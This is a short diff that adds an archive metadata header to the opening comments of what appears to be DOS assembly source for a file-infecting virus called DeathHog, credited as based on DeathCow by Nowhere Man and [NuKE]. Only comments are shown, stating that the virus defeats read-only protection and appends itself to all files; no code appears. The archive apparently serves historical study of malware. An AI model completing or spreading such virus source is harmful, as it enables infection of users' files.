@@ -1,3 +1,14 @@
+; ------------------------------------------------------------
+; name      D
+; type      asm
+; cve       —
+; year      unknown
+; os        DOS
+; authors   unknown
+; source    krisyotam
+; archived  krisyotam (2026)
+; notes     —
+; ------------------------------------------------------------
 ; DeathHog, (will defeat read-only files and appends itself to all
 ; files)
 ; Originally based upon DeathCow (C) 1991 by Nowhere Man and [NuKE] WaErZ 
